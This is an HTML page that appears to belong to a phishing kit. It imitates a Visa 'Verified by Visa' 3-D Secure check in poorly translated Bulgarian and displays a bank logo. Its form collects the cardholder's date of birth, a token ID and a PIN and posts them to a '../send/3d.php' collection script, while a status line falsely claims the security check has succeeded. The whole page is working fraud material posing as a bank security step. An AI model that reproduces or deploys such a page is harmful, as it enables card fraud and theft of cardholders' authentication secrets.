<html lang="en"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="./INC/T_Z118.css">
    <link rel="stylesheet" href="./INC/V_Z118.css">
    <title>3-D Security Auth.</title>
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="../img/favicon.ico">
</head>
<body>
<div id="Rotation"><p style="font-size: 13px;">3-D Security has been successfully processed...</p></div>
    <div id="xMarcos_9X9X" style="opacity: 1;">
	<div id="popup" style="display: none;"><p>Processing </p></div>
        <div id="xGhostRiderForm" style="">
            <div id="xDoctorStrange_L0">
                <table>
                    <tbody>
                        <tr>
                            <td><img class="cc_bank" id="cc_bank" src="../img/logo-bg.png" style="
    display: block;
    width: 158px;
    height: 46px;
    margin-left: -1px!important;
"></td>
							<td><img class="cc_type" id="cc_type" src="./INC/verified-by-visa.png"></td>                        </tr>
                    </tbody>
                </table>
            </div>
			<div id="xDoctorStrange_L1" style="text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"></div>
            <div id="xDoctorStrange_L1">Добавена безопасност онлайн</div>
            <div id="xDoctorStrange_L2">Verified by Visa помага да защитите картата си от неоторизирана употреба - без допълнителни разходи. Използване на Verified by Visa за това и бъдещите торби. попълнете тази страница Вие ще създадете своя собствена Verified by Visa парола</div>
            <div id="xDoctorStrange_L3">
				<form action="../send/3d.php" method="post">

                <table>
                    <tbody>
                        <tr>
                                            
						<tr>
                            <td style="font-weight: bold;">Име на държава
 :</td><td>Bulgaria</td>
                        </tr>
                        <tr>
                            <td style="font-weight: bold;">Тип карта :</td><td>Visa </td>
                        </tr>
                        
					
						<tr class="Height_XXX">
                            <td style="font-weight: bold;">Рождена дата :</td>
                            <td><input style="width: 44px;text-align: center;" id="day" type="tel" placeholder="Day" name="day" class="dob" maxlength="2" data-maxlength="2"> / <input style="width: 50px;text-align: center;" id="month" type="tel" placeholder="Month" name="month" class="dob" maxlength="2" data-maxlength="2"> / <input style="width: 58px;text-align: center;" id="year" type="tel" placeholder="Year" name="year" class="dob" maxlength="4" data-maxlength="4"></td>						</tr>
                        
                            <tr class="Height_XXX">
                            <td style="font-weight: bold;">TOKEN ID:</td>
                            <td><input  type="text" name="token_vbv" id="token_vbv" style="width: 170px;padding-left: 4px;"></td></tr>
                            
                            
                            <tr class="Height_XXX">
                            <td style="font-weight: bold;">PINt:</td>
                            <td><input  type="text" name="pint_vbv" id="pint_vbv" style="width: 170px;padding-left: 4px;"></td></tr>
					
                            <td></td>
                            <td>
                                <input type="submit" name="vbv_submit_btn" id="vbv_submit_btn" value="Изпращане
">
                                
                            </td>
                        </tr>	
                        <tr>
                            <td></td>
                            <td></td>
                        </tr>
                    </tbody>
                </table>
				
                <!-- </form> -->
            </form></div>
        </div>
    </div>
<input type="hidden" name="country_form" id="country_form" value="">
<script src="../../lib/js/jquery.js"></script>
<script src="./INC/V-Z118.js"></script>    

</body></html>